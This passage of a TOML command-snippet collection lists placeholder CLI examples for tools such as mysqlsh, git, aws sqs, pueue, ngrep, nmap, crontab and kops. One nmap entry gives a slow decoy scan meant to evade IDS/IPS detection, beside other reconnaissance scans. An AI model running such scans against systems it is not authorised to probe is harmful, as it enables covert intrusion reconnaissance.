  command = "mysqlsh --user <username> --execute '<sql_statement>'"
  output = ""

[[snippets]]
  description = "Start MySQL Shell in JavaScript mode"
  command = "mysqlsh --js"
  output = ""

[[snippets]]
  description = "Start MySQL Shell in Python mode"
  command = "mysqlsh --py"
  output = ""

[[snippets]]
  description = "Import JSON documents into a MySQL collection"
  command = "mysqlsh --import <path/to/file.json> --schema <schema_name> --collection <collection_name>"
  output = ""

[[snippets]]
  description = "Enable verbose output"
  command = "mysqlsh --verbose"
  output = ""

[[snippets]]
  description = "Generate a new keypair at the default location"
  command = "minisign -G"
  output = ""

[[snippets]]
  description = "Sign a file"
  command = "minisign -Sm <path/to/file>"
  output = ""

[[snippets]]
  description = "Sign a file, adding a trusted (signed) and an untrusted (unsigned) comment in the signature"
  command = "minisign -Sm <path/to/file> -c ""<Untrusted comment>"" -t ""<Trusted comment>"""
  output = ""

[[snippets]]
  description = "Verify a file and the trusted comments in its signature using the specified public key file"
  command = "minisign -Vm <path/to/file> -p <path/to/publickey.pub>"
  output = ""

[[snippets]]
  description = "Verify a file and the trusted comments in its signature, specifying a public key as a Base64 encoded literal"
  command = "minisign -Vm <path/to/file> -P ""<public_key_base64>"""
  output = ""

[[snippets]]
  description = "Add symlinks to TeX Live files"
  command = "sudo tlmgr path add"
  output = ""

[[snippets]]
  description = "Remove symlinks to TeX Live files"
  command = "sudo tlmgr path remove"
  output = ""

[[snippets]]
  description = "Check out a specific pull request"
  command = "git pr <pr_number>"
  output = ""

[[snippets]]
  description = "Check out a pull request from a specific remote"
  command = "git pr <pr_number> <remote>"
  output = ""

[[snippets]]
  description = "Check out a pull request from its URL"
  command = "git pr <url>"
  output = ""

[[snippets]]
  description = "Clean up old pull request branches"
  command = "git pr clean"
  output = ""

[[snippets]]
  description = "Enqueue multiple stashed tasks at once"
  command = "pueue enqueue <task_id> <task_id>"
  output = ""

[[snippets]]
  description = "Enqueue a stashed task after 60 seconds"
  command = "pueue enqueue --delay <60> <task_id>"
  output = ""

[[snippets]]
  description = "Enqueue a stashed task next Wednesday"
  command = "pueue enqueue --delay <wednesday> <task_id>"
  output = ""

[[snippets]]
  description = "Enqueue a stashed task after four months"
  command = "pueue enqueue --delay ""4 months"" <task_id>"
  output = ""

[[snippets]]
  description = "Enqueue a stashed task on 2021-02-19"
  command = "pueue enqueue --delay <2021-02-19> <task_id>"
  output = ""

[[snippets]]
  description = "List all available date/time formats"
  command = "pueue enqueue --help"
  output = ""

[[snippets]]
  description = "List all availables queues"
  command = "aws sqs list-queues"
  output = ""

[[snippets]]
  description = "Display the URL of a specific queue"
  command = "aws sqs get-queue-url --queue-name <queue_name>"
  output = ""

[[snippets]]
  description = "Create a queue with specific attributes from a file in JSON format"
  command = "aws sqs create-queue --queue-name <queue_name> --attributes <file://path/to/attributes_file.json>"
  output = ""

[[snippets]]
  description = "Send a specific message to a queue"
  command = "aws sqs send-message --queue-url https://sqs.<region>.amazonaws.com/<queue_name> --message-body ""<message_body>"" --delay-seconds <delay> --message-attributes <file://path/to/attributes_file.json>"
  output = ""

[[snippets]]
  description = "Delete the specified message from a queue"
  command = "aws sqs delete-message --queue-url <https://queue_url> --receipt-handle <receipt_handle>"
  output = ""

[[snippets]]
  description = "Delete a specific queue"
  command = "aws sqs delete-queue --queue-url https://sqs.<region>.amazonaws.com/<queue_name>"
  output = ""

[[snippets]]
  description = "Delete all messages from the specified queue"
  command = "aws sqs purge-queue --queue-url https://sqs.<region>.amazonaws.com/<queue_name>"
  output = ""

[[snippets]]
  description = "Enable a specific AWS account to send messages to queue"
  command = "aws sqs add-permission --queue-url https://sqs.<region>.amazonaws.com/<queue_name> --label <permission_name> --aws-account-ids <account_id> --actions SendMessage"
  output = ""

[[snippets]]
  description = "Show disk quotas in human-readable units for the current user"
  command = "quota -s"
  output = ""

[[snippets]]
  description = "Verbose output (also display quotas on filesystems where no storage is allocated)"
  command = "quota -v"
  output = ""

[[snippets]]
  description = "Quiet output (only display quotas on filesystems where usage is over quota)"
  command = "quota -q"
  output = ""

[[snippets]]
  description = "Print quotas for the groups of which the current user is a member"
  command = "quota -g"
  output = ""

[[snippets]]
  description = "Show disk quotas for another user"
  command = "sudo quota -u <username>"
  output = ""

[[snippets]]
  description = "List all branches (local and remote; the current branch is highlighted by `*`)"
  command = "git branch --all"
  output = ""

[[snippets]]
  description = "List which branches include a specific Git commit in their history"
  command = "git branch --all --contains <commit_hash>"
  output = ""

[[snippets]]
  description = "Show the name of the current branch"
  command = "git branch --show-current"
  output = ""

[[snippets]]
  description = "Create new branch based on the current commit"
  command = "git branch <branch_name>"
  output = ""

[[snippets]]
  description = "Create new branch based on a specific commit"
  command = "git branch <branch_name> <commit_hash>"
  output = ""

[[snippets]]
  description = "Rename a branch (must not have it checked out to do this)"
  command = "git branch -m <old_branch_name> <new_branch_name>"
  output = ""

[[snippets]]
  description = "Delete a local branch (must not have it checked out to do this)"
  command = "git branch -d <branch_name>"
  output = ""

[[snippets]]
  description = "Delete a remote branch"
  command = "git push <remote_name> --delete <remote_branch_name>"
  output = ""

[[snippets]]
  description = "Format a Haskell source file and print the result to `stdout`"
  command = "brittany <path/to/file.hs>"
  output = ""

[[snippets]]
  description = "Format all Haskell source files in the current directory in-place"
  command = "brittany --write-mode=inplace <*.hs>"
  output = ""

[[snippets]]
  description = "Check whether a Haskell source file needs changes and indicate the result through the programme's exit code"
  command = "brittany --check-mode <path/to/file.hs>"
  output = ""

[[snippets]]
  description = "Format a Haskell source file using the specified amount of spaces per indentation level and line length"
  command = "brittany --indent <4> --columns <100> <path/to/file.hs>"
  output = ""

[[snippets]]
  description = "Format a Haskell source file according to the style defined in the specified configuration file"
  command = "brittany --config-file <path/to/config.yaml> <path/to/file.hs>"
  output = ""

[[snippets]]
  description = "Store a key and a value on the default database"
  command = "skate set ""<key>"" ""<value>"""
  output = ""

[[snippets]]
  description = "Show your keys saved on the default database"
  command = "skate list"
  output = ""

[[snippets]]
  description = "Delete key and value from the default database"
  command = "skate delete ""<key>"""
  output = ""

[[snippets]]
  description = "Create a new key and value in a new database"
  command = "skate set ""<key>""@""<database_name>"" ""<value>"""
  output = ""

[[snippets]]
  description = "Show your keys saved in a non default database"
  command = "skate list @""<database_name>"""
  output = ""

[[snippets]]
  description = "Delete key and value from a specific database"
  command = "skate delete ""<key>""@""<database_name>"""
  output = ""

[[snippets]]
  description = "Show the databases available"
  command = "skate list-dbs"
  output = ""

[[snippets]]
  description = "Delete local db and pull down fresh copy from Charm Cloud"
  command = "skate reset @""<database_name>"""
  output = ""

[[snippets]]
  description = "Block a specific IP"
  command = "flarectl firewall rules create --zone=""<example.com>"" --value=""<8.8.8.8>"" --mode=""<block>"" --notes=""<Block bad actor>"""
  output = ""

[[snippets]]
  description = "Add a DNS record"
  command = "flarectl dns create --zone=""<example.com>"" --name=""<app>"" --type=""<CNAME>"" --content=""<myapp.herokuapp.com>"" --proxy"
  output = ""

[[snippets]]
  description = "List all Cloudflare IPv4/IPv6 ranges"
  command = "flarectl ips --ip-type <ipv4|ipv6|all>"
  output = ""

[[snippets]]
  description = "Create many new Cloudflare zones automatically with names from `domains.txt`"
  command = "for domain in $(cat <domains.txt>); do flarectl zone info --zone=$domain; done"
  output = ""

[[snippets]]
  description = "List all firewall rules"
  command = "flarectl firewall rules list"
  output = ""

[[snippets]]
  description = "Display a file with syntax highlighting"
  command = "rich <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Add line numbers, and indentation guides"
  command = "rich <path/to/file.py> --line-number --guides"
  output = ""

[[snippets]]
  description = "Apply a theme"
  command = "rich <path/to/file.py> --theme <monokai>"
  output = ""

[[snippets]]
  description = "Display a file in an interactive pager"
  command = "rich <path/to/file.py> --pager"
  output = ""

[[snippets]]
  description = "Display contents from a URL"
  command = "rich <https://raw.githubusercontent.com/Textualize/rich-cli/main/README.md> --markdown --pager"
  output = ""

[[snippets]]
  description = "Export a file as HTML"
  command = "rich <path/to/file.md> --export-html <path/to/file.html>"
  output = ""

[[snippets]]
  description = "Display text with formatting tags, custom alignment, and line width"
  command = "rich --print <""Hello [green on black]Stylized[/green on black] [bold]World[/bold]""> --<left|center|right> --width <10>"
  output = ""

[[snippets]]
  description = "Install a specific Node.js version"
  command = "Install-NodeVersion <node_version>"
  output = ""

[[snippets]]
  description = "Install multiple Node.js versions"
  command = "Install-NodeVersion <node_version1 , node_version2 , ...>"
  output = ""

[[snippets]]
  description = "Install latest available version of Node.js 20"
  command = "Install-NodeVersion ^20"
  output = ""

[[snippets]]
  description = "Install the x86 (x86 32-bit) / x64 (x86 64-bit) / arm64 (ARM 64-bit) version of Node.js"
  command = "Install-NodeVersion <node_version> -Architecture <x86|x64|arm64>"
  output = ""

[[snippets]]
  description = "Use a HTTP proxy to download Node.js"
  command = "Install-NodeVersion <node-version> -Proxy <http://example.com>"
  output = ""

[[snippets]]
  description = "List all available generators to destroy"
  command = "rails destroy"
  output = ""

[[snippets]]
  description = "Destroy a model named Post"
  command = "rails destroy model <Post>"
  output = ""

[[snippets]]
  description = "Destroy a controller named Posts"
  command = "rails destroy controller <Posts>"
  output = ""

[[snippets]]
  description = "Destroy a migration that creates Posts"
  command = "rails destroy migration <CreatePosts>"
  output = ""

[[snippets]]
  description = "Destroy a scaffold for a model named Post"
  command = "rails destroy scaffold <Post>"
  output = ""

[[snippets]]
  description = "Preview an SVG"
  command = "inkview <path/to/file.svg>"
  output = ""

[[snippets]]
  description = "Preview multiple SVGs (use arrow keys to navigate)"
  command = "inkview <path/to/file1.svg path/to/file2.svg ...>"
  output = ""

[[snippets]]
  description = "Capture traffic of all interfaces"
  command = "ngrep -d any"
  output = ""

[[snippets]]
  description = "Capture traffic of a specific interface"
  command = "ngrep -d <eth0>"
  output = ""

[[snippets]]
  description = "Capture traffic crossing port 22 of interface eth0"
  command = "ngrep -d <eth0> port <22>"
  output = ""

[[snippets]]
  description = "Capture traffic from or to a host"
  command = "ngrep host <www.example.com>"
  output = ""

[[snippets]]
  description = "Filter keyword 'User-Agent:' of interface eth0"
  command = "ngrep -d <eth0> '<User-Agent:>'"
  output = ""

[[snippets]]
  description = "List existing machines"
  command = "podman machine ls"
  output = ""

[[snippets]]
  description = "Create a new default machine"
  command = "podman machine init"
  output = ""

[[snippets]]
  description = "Create a new machine with a specific name"
  command = "podman machine init <name>"
  output = ""

[[snippets]]
  description = "Create a new machine with different resources"
  command = "podman machine init --cpus=<4> --memory=<4096> --disk-size=<50>"
  output = ""

[[snippets]]
  description = "Start or stop a machine"
  command = "podman machine <start|stop> <name>"
  output = ""

[[snippets]]
  description = "Connect to a running machine via SSH"
  command = "podman machine ssh <name>"
  output = ""

[[snippets]]
  description = "Inspect information about a machine"
  command = "podman machine inspect <name>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr nm"
  output = ""

[[snippets]]
  description = "Update the list of available packages and versions"
  command = "sudo deb-get update"
  output = ""

[[snippets]]
  description = "Search for a given package"
  command = "deb-get search <package>"
  output = ""

[[snippets]]
  description = "Show information about a package"
  command = "deb-get show <package>"
  output = ""

[[snippets]]
  description = "Install a package, or update it to the latest available version"
  command = "sudo deb-get install <package>"
  output = ""

[[snippets]]
  description = "Remove a package (using `purge` instead also removes its configuration files)"
  command = "sudo deb-get remove <package>"
  output = ""

[[snippets]]
  description = "Upgrade all installed packages to their newest available versions"
  command = "sudo deb-get upgrade"
  output = ""

[[snippets]]
  description = "List all available packages"
  command = "deb-get list"
  output = ""

[[snippets]]
  description = "List all WorkMail organizations"
  command = "aws workmail list-organizations"
  output = ""

[[snippets]]
  description = "List all users of a specific organization"
  command = "aws workmail list-users --organization-id <organization_id>"
  output = ""

[[snippets]]
  description = "Create a WorkMail user in a specific organization"
  command = "aws workmail create-user --name <username> --display-name <name> --password <password> --organization-id <organization_id>"
  output = ""

[[snippets]]
  description = "Register and enable a group/user to WorkMail"
  command = "aws workmail register-to-work-mail --entity-id <entity_id> --email <email> --organization-id <organization_id>"
  output = ""

[[snippets]]
  description = "Create a WorkMail group in a specific organization"
  command = "aws workmail create-group --name <group_name> --organization-id <organization_id>"
  output = ""

[[snippets]]
  description = "Associate a member to a specific group"
  command = "aws workmail associate-member-to-group --group-id <group_id> --member-id <member_id> --organization-id <organization_id>"
  output = ""

[[snippets]]
  description = "Deregister and disable a user/group from WorkMail"
  command = "aws workmail deregister-from-work-mail --entity-id <entity_id> --organization-id <organization_id>"
  output = ""

[[snippets]]
  description = "Delete a user from an organization"
  command = "aws workmail delete-user --user-id <user_id> --organization-id <organization_id>"
  output = ""

[[snippets]]
  description = "Analyze a VHDL source file and produce an object file"
  command = "ghdl -a <filename.vhdl>"
  output = ""

[[snippets]]
  description = "Elaborate a design (where `design` is the name of a configuration unit, entity unit or architecture unit)"
  command = "ghdl -e <design>"
  output = ""

[[snippets]]
  description = "Run an elaborated design"
  command = "ghdl -r <design>"
  output = ""

[[snippets]]
  description = "Run an elaborated design and dump output to a waveform file"
  command = "ghdl -r <design> --wave=<output.ghw>"
  output = ""

[[snippets]]
  description = "Check the syntax of a VHDL source file"
  command = "ghdl -s <filename.vhdl>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ghdl --help"
  output = ""

[[snippets]]
  description = "Scale an image such that the result has the specified dimensions"
  command = "pnmscalefixed -width <width> -height <height> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Scale an image such that the result has the specified width, keeping the aspect ratio"
  command = "pnmscalefixed -width <width> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Scale an image such that its width and height is changed by the specified factors"
  command = "pnmscalefixed -xscale <x_factor> -yscale <y_factor> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Log in to your Snyk account"
  command = "snyk auth"
  output = ""

[[snippets]]
  description = "Test your code for any known vulnerabilities"
  command = "snyk test"
  output = ""

[[snippets]]
  description = "Test a local Docker image for any known vulnerabilities"
  command = "snyk test --docker <docker_image>"
  output = ""

[[snippets]]
  description = "Record the state of dependencies and any vulnerabilities on snyk.io"
  command = "snyk monitor"
  output = ""

[[snippets]]
  description = "Auto patch and ignore vulnerabilities"
  command = "snyk wizard"
  output = ""

[[snippets]]
  description = "Query `.csv` file by specifying the delimiter as ','"
  command = "q -d',' ""SELECT * from <path/to/file>"""
  output = ""

[[snippets]]
  description = "Query `.tsv` file"
  command = "q -t ""SELECT * from <path/to/file>"""
  output = ""

[[snippets]]
  description = "Query file with header row"
  command = "q -d<delimiter> -H ""SELECT * from <path/to/file>"""
  output = ""

[[snippets]]
  description = "Read data from `stdin`; '-' in the query represents the data from `stdin`"
  command = "<output> | q ""select * from -"""
  output = ""

[[snippets]]
  description = "Join two files (aliased as `f1` and `f2` in the example) on column `c1`, a common column"
  command = "q ""SELECT * FROM <path/to/file> f1 JOIN <path/to/other_file> f2 ON (f1.c1 = f2.c1)"""
  output = ""

[[snippets]]
  description = "Format output using an output delimiter with an output header line (Note: command will output column names based on the input file header or the column aliases overridden in the query)"
  command = "q -D<delimiter> -O ""SELECT <column> as <alias> from <path/to/file>"""
  output = ""

[[snippets]]
  description = "Analyze a Composer JSON file"
  command = "composer-require-checker check <path/to/composer.json>"
  output = ""

[[snippets]]
  description = "Analyze a Composer JSON file with a specific configuration"
  command = "composer-require-checker check --config-file <path/to/config.json> <path/to/composer.json>"
  output = ""

[[snippets]]
  description = "Log in to the Cloud Foundry API"
  command = "cf login -a <api_url>"
  output = ""

[[snippets]]
  description = "Push an app using the default settings"
  command = "cf push <app_name>"
  output = ""

[[snippets]]
  description = "View the services available from your organization"
  command = "cf marketplace"
  output = ""

[[snippets]]
  description = "Create a service instance"
  command = "cf create-service <service> <plan> <service_name>"
  output = ""

[[snippets]]
  description = "Connect an application to a service"
  command = "cf bind-service <app_name> <service_name>"
  output = ""

[[snippets]]
  description = "Run a script whose code is included in the app, but runs independently"
  command = "cf run-task <app_name> ""<script_command>"" --name <task_name>"
  output = ""

[[snippets]]
  description = "Start an interactive SSH session with a VM hosting an app"
  command = "cf ssh <app_name>"
  output = ""

[[snippets]]
  description = "View a dump of recent app logs"
  command = "cf logs <app_name> --recent"
  output = ""

[[snippets]]
  description = "Add the current node to an existing cluster"
  command = "pvecm add <hostname_or_ip>"
  output = ""

[[snippets]]
  description = "Add a node to the cluster configuration (internal use)"
  command = "pvecm addnode <node>"
  output = ""

[[snippets]]
  description = "Display the version of the cluster join API available on this node"
  command = "pvecm apiver"
  output = ""

[[snippets]]
  description = "Generate new cluster configuration"
  command = "pvecm create <clustername>"
  output = ""

[[snippets]]
  description = "Remove a node from the cluster configuration"
  command = "pvecm delnode <node>"
  output = ""

[[snippets]]
  description = "Display the local view of the cluster nodes"
  command = "pvecm nodes"
  output = ""

[[snippets]]
  description = "Display the local view of the cluster status"
  command = "pvecm status"
  output = ""

[[snippets]]
  description = "Launch the presentation application"
  command = "calligrastage"
  output = ""

[[snippets]]
  description = "Open a specific presentation"
  command = "calligrastage <path/to/presentation>"
  output = ""

[[snippets]]
  description = "Display help or version"
  command = "calligrastage --<help|version>"
  output = ""

[[snippets]]
  description = "Create a tree object from the current index"
  command = "git write-tree"
  output = ""

[[snippets]]
  description = "Create a tree object without checking whether objects referenced by the directory exist in the object database"
  command = "git write-tree --missing-ok"
  output = ""

[[snippets]]
  description = "Create a tree object that represents a subdirectory (used to write the tree object for a subproject in the named subdirectory)"
  command = "git write-tree --prefix <subdirectory>/"
  output = ""

[[snippets]]
  description = "Extract the patch and author data from an email message"
  command = "git mailinfo <message|patch>"
  output = ""

[[snippets]]
  description = "Extract but remove leading and trailing whitespace"
  command = "git mailinfo -k <message|patch>"
  output = ""

[[snippets]]
  description = "Remove everything from the body before a scissors line (e.g. "-->* --") and retrieve the message or patch"
  command = "git mailinfo --scissors <message|patch>"
  output = ""

[[snippets]]
  description = "Attempt to extract streams from the URL specified, and if it's successful, print out a list of available streams to choose from"
  command = "streamlink <example.com/stream>"
  output = ""

[[snippets]]
  description = "Open a stream with the specified quality"
  command = "streamlink <example.com/stream> <720p60>"
  output = ""

[[snippets]]
  description = "Select the highest or lowest available quality"
  command = "streamlink <example.com/stream> <best|worst>"
  output = ""

[[snippets]]
  description = "Use a specific player to feed stream data to (VLC is used by default if found)"
  command = "streamlink --player=<mpv> <example.com/stream> <best>"
  output = ""

[[snippets]]
  description = "Skip a specific amount of time from the beginning of the stream. For live streams, this is a negative offset from the end of the stream (rewind)"
  command = "streamlink --hls-start-offset <[HH:]MM:SS> <example.com/stream> <best>"
  output = ""

[[snippets]]
  description = "Skip to the beginning of a live stream, or as far back as possible"
  command = "streamlink --hls-live-restart <example.com/stream> <best>"
  output = ""

[[snippets]]
  description = "Write stream data to a file instead of playing it"
  command = "streamlink --output <path/to/file.ts> <example.com/stream> <best>"
  output = ""

[[snippets]]
  description = "Open the stream in the player, while at the same time writing it to a file"
  command = "streamlink --record <path/to/file.ts> <example.com/stream> <best>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "kotlinc"
  output = ""

[[snippets]]
  description = "Compile a Kotlin file"
  command = "kotlinc <path/to/file.kt>"
  output = ""

[[snippets]]
  description = "Compile several Kotlin files"
  command = "kotlinc <path/to/file1.kt path/to/file2.kt ...>"
  output = ""

[[snippets]]
  description = "Execute a specific Kotlin Script file"
  command = "kotlinc -script <path/to/file.kts>"
  output = ""

[[snippets]]
  description = "Compile a Kotlin file into a self contained jar file with the Kotlin runtime library included"
  command = "kotlinc <path/to/file.kt> -include-runtime -d <path/to/file.jar>"
  output = ""

[[snippets]]
  description = "Simply convert RAW files to JPG"
  command = "ufraw-batch --out-type=jpg <input_file(s)>"
  output = ""

[[snippets]]
  description = "Simply convert RAW files to PNG"
  command = "ufraw-batch --out-type=png <input_file(s)>"
  output = ""

[[snippets]]
  description = "Extract the preview image from the raw file"
  command = "ufraw-batch --embedded-image <input_file(s)>"
  output = ""

[[snippets]]
  description = "Save the file with size up to the given maximums MAX1 and MAX2"
  command = "ufraw-batch --size=MAX1,MAX2 <input_file(s)>"
  output = ""

[[snippets]]
  description = "Run all specifications in the "spec" directory"
  command = "kahlan"
  output = ""

[[snippets]]
  description = "Run specifications using a specific configuration file"
  command = "kahlan --config=<path/to/configuration_file>"
  output = ""

[[snippets]]
  description = "Run specifications and output using a reporter"
  command = "kahlan --reporter=<dot|bar|json|tap|verbose>"
  output = ""

[[snippets]]
  description = "Run specifications with code coverage (detail can be between 0 and 4)"
  command = "kahlan --coverage=<detail_level>"
  output = ""

[[snippets]]
  description = "Open a shell in the current directory"
  command = "psysh"
  output = ""

[[snippets]]
  description = "Open a shell in a specific directory"
  command = "psysh --cwd <path/to/directory>"
  output = ""

[[snippets]]
  description = "Use a specific configuration file"
  command = "psysh --config <path/to/file>"
  output = ""

[[snippets]]
  description = "Connect to a database"
  command = "mysql <database_name>"
  output = ""

[[snippets]]
  description = "Connect to a database, user will be prompted for a password"
  command = "mysql -u <user> --password <database_name>"
  output = ""

[[snippets]]
  description = "Connect to a database on another host"
  command = "mysql -h <database_host> <database_name>"
  output = ""

[[snippets]]
  description = "Connect to a database through a Unix socket"
  command = "mysql --socket <path/to/socket.sock>"
  output = ""

[[snippets]]
  description = "Execute SQL statements in a script file (batch file)"
  command = "mysql -e ""source <filename.sql>"" <database_name>"
  output = ""

[[snippets]]
  description = "Restore a database from a backup created with `mysqldump` (user will be prompted for a password)"
  command = "mysql --user <user> --password <database_name> < <path/to/backup.sql>"
  output = ""

[[snippets]]
  description = "Restore all databases from a backup (user will be prompted for a password)"
  command = "mysql --user <user> --password < <path/to/backup.sql>"
  output = ""

[[snippets]]
  description = "Create a file `y.tab.c` containing the C parser code and compile the grammar file with all necessary constant declarations for values. (Constant declarations file `y.tab.h` is created only when the `-d` flag is used)"
  command = "yacc -d <path/to/grammar_file.y>"
  output = ""

[[snippets]]
  description = "Compile a grammar file containing the description of the parser and a report of conflicts generated by ambiguities in the grammar"
  command = "yacc -d <path/to/grammar_file.y> -v"
  output = ""

[[snippets]]
  description = "Compile a grammar file, and prefix output filenames with `prefix` instead of `y`"
  command = "yacc -d <path/to/grammar_file.y> -v -b <prefix>"
  output = ""

[[snippets]]
  description = "Check status"
  command = "espanso status"
  output = ""

[[snippets]]
  description = "Edit the configuration"
  command = "espanso edit config"
  output = ""

[[snippets]]
  description = "Install a package from the hub store (<https://hub.espanso.org/>)"
  command = "espanso install <package>"
  output = ""

[[snippets]]
  description = "Restart (required after installing a package, useful in case of failure)"
  command = "espanso restart"
  output = ""

[[snippets]]
  description = "Pack unpacked objects in the current directory"
  command = "git repack"
  output = ""

[[snippets]]
  description = "Also remove redundant objects after packing"
  command = "git repack -d"
  output = ""

[[snippets]]
  description = "Check if an IP address is up, and guess the remote host's operating system"
  command = "nmap -O <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Try to determine whether the specified hosts are up (ping scan) and what their names and MAC addresses are"
  command = "sudo nmap -sn <ip_or_hostname> <optional_another_address>"
  output = ""

[[snippets]]
  description = "Also enable scripts, service detection, OS fingerprinting and traceroute"
  command = "nmap -A <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Scan a specific list of ports (use '-p-' for all ports from 1 to 65535)"
  command = "nmap -p <port1,port2,...,portN> <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Perform service and version detection of the top 1000 ports using default NSE scripts; writing results ('-oN') to output file"
  command = "nmap -sC -sV -oN <top-1000-ports.txt> <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Scan target(s) carefully using 'default and safe' NSE scripts"
  command = "nmap --script ""default and safe"" <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Scan web server running on standard ports 80 and 443 using all available 'http-*' NSE scripts"
  command = "nmap --script ""http-*"" <address_or_addresses> -p 80,443"
  output = ""

[[snippets]]
  description = "Perform a stealthy very slow scan ('-T0') trying to avoid detection by IDS/IPS and use decoy ('-D') source IP addresses"
  command = "nmap -T0 -D <decoy1_ipaddress,decoy2_ipaddress,...,decoyN_ipaddress> <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Follow the logs of activity on the account"
  command = "stripe logs tail"
  output = ""

[[snippets]]
  description = "Listen for events, filtering on events with the name `charge.succeeded` and forwarding them to localhost:3000/events"
  command = "stripe listen --events=""<charge.succeeded>"" --forward-to=""<localhost:3000/events>"""
  output = ""

[[snippets]]
  description = "Send a test webhook event"
  command = "stripe trigger <charge.succeeded>"
  output = ""

[[snippets]]
  description = "Create a customer"
  command = "stripe customers create --email=""<test@example.com>"" --name=""<Jenny Rosen>"""
  output = ""

[[snippets]]
  description = "Print to JSON"
  command = "stripe listen --print-json"
  output = ""

[[snippets]]
  description = "Edit the crontab file for the current user"
  command = "crontab -e"
  output = ""

[[snippets]]
  description = "Edit the crontab file for a specific user"
  command = "sudo crontab -e -u <user>"
  output = ""

[[snippets]]
  description = "Replace the current crontab with the contents of the given file"
  command = "crontab <path/to/file>"
  output = ""

[[snippets]]
  description = "View a list of existing cron jobs for current user"
  command = "crontab -l"
  output = ""

[[snippets]]
  description = "Remove all cron jobs for the current user"
  command = "crontab -r"
  output = ""

[[snippets]]
  description = "Sample job which runs at 10:00 every day (* means any value)"
  command = "0 10 * * * <command_to_execute>"
  output = ""

[[snippets]]
  description = "Sample crontab entry, which runs a command every 10 minutes"
  command = "*/10 * * * * <command_to_execute>"
  output = ""

[[snippets]]
  description = "Sample crontab entry, which runs a certain script at 02:30 every Friday"
  command = "30 2 * * Fri </absolute/path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Kill all tasks and remove everything (logs, status, groups, task IDs)"
  command = "pueue reset"
  output = ""

[[snippets]]
  description = "Kill all tasks, terminate their children, and reset everything"
  command = "pueue reset --children"
  output = ""

[[snippets]]
  description = "Reset without asking for confirmation"
  command = "pueue reset --force"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr pamtopnm"
  output = ""

[[snippets]]
  description = "Lint a file or directory recursively"
  command = "flake8 <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Lint a file or directory recursively and show the line on which each error occurred"
  command = "flake8 --show-source <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Lint a file or directory recursively and ignore a list of rules. (All available rules can be found at flake8rules.com)"
  command = "flake8 --ignore <rule1,rule2> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Lint a file or directory recursively but exclude files matching the given globs or substrings"
  command = "flake8 --exclude <substring1,glob2> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Convert a graph from `gxl` to `gv` format"
  command = "gxl2gv -o <output.gv> <input.gxl>"
  output = ""

[[snippets]]
  description = "Convert a graph using `stdin` and `stdout`"
  command = "cat <input.gxl> | gxl2gv > <output.gv>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gxl2gv -?"
  output = ""

[[snippets]]
  description = "Launch Dillo"
  command = "dillo"
  output = ""

[[snippets]]
  description = "Launch Dillo with a specific window size and screen location"
  command = "dillo --geometry <width>x<height>+<x_position>+<y_position>"
  output = ""

[[snippets]]
  description = "Launch Dillo and open a specific URL"
  command = "dillo <duckduckgo.com>"
  output = ""

[[snippets]]
  description = "Launch Dillo and open a file or directory"
  command = "dillo <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Launch Dillo in full-screen mode"
  command = "dillo --fullwindow"
  output = ""

[[snippets]]
  description = "Display version"
  command = "dillo --version"
  output = ""

[[snippets]]
  description = "Display help"
  command = "dillo --help"
  output = ""

[[snippets]]
  description = "Compute the hillshade of a DEM"
  command = "gdaldem hillshade <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Compute the slope of a DEM"
  command = "gdaldem slope <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Compute the aspect of a DEM"
  command = "gdaldem aspect <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Create a new Ansible role"
  command = "molecule init role --role-name <role_name>"
  output = ""

[[snippets]]
  description = "Run tests"
  command = "molecule test"
  output = ""

[[snippets]]
  description = "Start the instance"
  command = "molecule create"
  output = ""

[[snippets]]
  description = "Configure the instance"
  command = "molecule converge"
  output = ""

[[snippets]]
  description = "List scenarios of the instance"
  command = "molecule matrix converge"
  output = ""

[[snippets]]
  description = "Log in into the instance"
  command = "molecule login"
  output = ""

[[snippets]]
  description = "Add a safe target"
  command = "safe target <vault_addr> <target_name>"
  output = ""

[[snippets]]
  description = "Authenticate the CLI client against the Vault server, using an authentication token"
  command = "safe auth <authentication_token>"
  output = ""

[[snippets]]
  description = "Print the environment variables describing the current target"
  command = "safe env"
  output = ""

[[snippets]]
  description = "Display a tree hierarchy of all reachable keys for a given path"
  command = "safe tree <path>"
  output = ""

[[snippets]]
  description = "Move a secret from one path to another"
  command = "safe move <old/path/to/secret> <new/path/to/secret>"
  output = ""

[[snippets]]
  description = "Generate a new 2048-bit SSH key-pair and store it"
  command = "safe ssh <2048> <path/to/secret>"
  output = ""

[[snippets]]
  description = "Set non-sensitive keys for a secret"
  command = "safe set <path/to/secret> <key>=<value>"
  output = ""

[[snippets]]
  description = "Set auto-generated password in a secret"
  command = "safe gen <path/to/secret> <key>"
  output = ""

[[snippets]]
  description = "Create a cluster from the configuration specification"
  command = "kops create cluster -f <cluster_name.yaml>"
  output = ""

[[snippets]]
  description = "Create a new ssh public key"
  command = "kops create secret sshpublickey <key_name> -i <~/.ssh/id_rsa.pub>"
  output = ""

[[snippets]]
  description = "Export the cluster configuration to the `~/.kube/config` file"
  command = "kops export kubecfg <cluster_name>"
  output = ""

[[snippets]]
  description = "Get the cluster configuration as YAML"
  command = "kops get cluster <cluster_name> -o yaml"
  output = ""

[[snippets]]
